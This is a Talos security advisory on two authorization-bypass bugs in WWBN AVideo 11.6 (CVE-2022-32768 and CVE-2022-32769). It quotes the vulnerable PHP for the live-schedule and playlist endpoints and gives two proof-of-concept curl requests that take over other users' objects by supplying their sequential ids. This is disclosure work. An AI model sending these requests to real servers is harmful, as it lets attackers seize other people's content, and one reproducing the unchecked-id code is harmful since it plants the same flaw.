# Talos Vulnerability Report

### TALOS-2022-1536

## WWBN AVideo objects id handling authentication bypass vulnerability

##### August 16, 2022

##### CVE Number

CVE-2022-32768,CVE-2022-32769

##### SUMMARY

Multiple authentication bypass vulnerabilities exist in the objects id handling functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. A specially-crafted HTTP request by an authenticated user can lead to unauthorized access and takeover of resources. An attacker can send an HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

WWBN AVideo 11.6

WWBN AVideo dev master commit 3f7c0364

##### PRODUCT URLS

AVideo - <https://github.com/WWBN/AVideo>

##### CVSSv3 SCORE

4.8 - CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L

##### CWE

CWE-862 - Missing Authorization

##### DETAILS

AVideo is a web application, mostly written in PHP, that can be used to create an audio/video sharing website. It allows users to import videos from various sources, encode and share them in various ways. Users can sign up to the website in order to share videos, while viewers have anonymous access to the publicly-available contents. The platform provides plugins for features like live streaming, skins, YouTube uploads and more.

To serve most types of requests that deal with objects modification, AVideo uses the `id` parameter to identify the object that needs to be modified. In some instances, AVideo does not check if the object belongs to the user that is requesting the modification, leading to integrity issues in the platform. An attacker can exploit this issue to take over live schedules and take over playlists owned by other users. The issues described in this advisory are found in plugins that are disabled by default.

#### CVE-2022-32768 - Live schedules

AVideo offers a plugin to stream RTMP videos over the network, called “Live”. By default this is disabled; an administrator can enable it in the plugin settings. An authenticated user needs video stream permission to trigger this vulnerability.

To add a live schedule, a request to `plugin/Live/view/Live_schedule/add.json.php` can be made:

```
...
// [1]
if (!User::canStream()) {
    $obj->msg = "You cant do this";
    die(json_encode($obj));
}

...
// [2]
$o = new Live_schedule(@$_POST['id']);
$o->setTitle($_POST['title']);
$o->setDescription($_POST['description']);
//$o->setKey($_POST['key']);
$o->setUsers_id(User::getId()); // [3]
$o->setLive_servers_id($_POST['live_servers_id']);
$o->setScheduled_time($_POST['scheduled_time']);
$o->setStatus($_POST['status']);
$o->setScheduled_password($_POST['scheduled_password']);
//$o->setPoster($_POST['poster']);
//$o->setPublic($_POST['public']);
//$o->setSaveTransmition($_POST['saveTransmition']);
//$o->setShowOnTV($_POST['showOnTV']);

if(!empty($_REQUEST['users_id_company'])){
    $myAffiliation = CustomizeUser::getAffiliateCompanies(User::getId());
    $users_id_list = array();
    foreach ($myAffiliation as $value) {
        $users_id_list[] = $value['users_id_company'];
    }
    if(in_array($_REQUEST['users_id_company'], $users_id_list)){
        $o->setusers_id_company($_REQUEST['users_id_company']);
    }
}

// [4]
if ($id = $o->save()) {
    $obj->msg = "{$_POST['title']} ".__('Saved');
    $obj->error = false;
} else {
    $obj->msg = __('Error on save')." {$_POST['title']}";
}
...

```

At [1] the code checks if the user is allowed to stream. At [2] a new live schedule is created, passing the `id` parameter. If such `id` exists, then the existing object is returned, otherwise a new live schedule is created. Then, several attributes are set and at [3] the user is set to the current user. Eventually, the live schedule is saved [4].

Since there are no checks to ensure the current user owns the live schedule id, any user that is allowed to stream can take over other users’ streams and change anything in them. The schedule will then disappear from the original owner view.

An attacker needs to know (or guess) the stream id. Guessing is trivial by default because ids are sequential.

#### Exploit Proof of Concept

If the `id` is known (in this case `27`), an attacker can issue the following request to steal a live schedule:

```
curl -k 'https://192.168.1.200/plugin/Live/view/Live_schedule/add.json.php' -X POST \
    -H 'Cookie: 84b11d010cced71edffee7aa62c4eda0=uot19510578r10nohk91j0sunb;' \
    --data-raw $'id=27&title=stolen&status=a&scheduled_time=2022-06-08+19%3A35&description=newdesc'

```
#### CVE-2022-32769 - Playlists

AVideo offers a plugin to create playlists (or “Programs”), called “PlayLists”. Default playlists are “watch later” and “favourites,” but custom playlists can be created too. By default this is disabled; an administrator can enable it in the plugin settings.

To add a new playlist schedule, a request to `objects/playlistAddNew.json.php` can be made:

```
...
require_once $global['systemRootPath'] . 'objects/playlist.php';

$plugin = AVideoPlugin::loadPluginIfEnabled("PlayLists");

if (empty($plugin)) {
    die('{"error":"Plugin not enabled"}');
}
if (!User::isLogged()) {  // [1]
    die('{"error":"'.__("Permission denied").'"}');
}
if (empty($_POST['name'])) {
    die('{"error":"'.__("Name can't be blank").'"}');
}
$obj = new PlayList(@$_POST['id']); // [2]
$obj->setName($_POST['name']);
$obj->setStatus($_POST['status']);
echo '{"status":"'.$obj->save().'"}'; // [3]

```

At [1] the code checks if the user is logged-in. At [2] a new playlist is created, using the `id` passed as parameter. If such `id` exists, then the existing object is returned; otherwise a new live schedule is created. At [3] the playlist is saved.

Since there are no checks to ensure the current user owns the playlist id, any logged-in user can take over other users’ playlists, read and change anything in them. The playlist will then disappear from the original owner view.

An attacker needs to know (or guess) the playlist id. Guessing is trivial by default because ids are sequential.

#### Exploit Proof of Concept

If the `id` is known (in this case `5`), an attacker can issue the following request to steal a playlist:

```
curl -k --cookie '84b11d010cced71edffee7aa62c4eda0=uot19510578r10nohk91j0sunb' \
    --data-raw 'id=5&name=newname' 'https://192.168.1.200/objects/playlistAddNew.json.php'

```
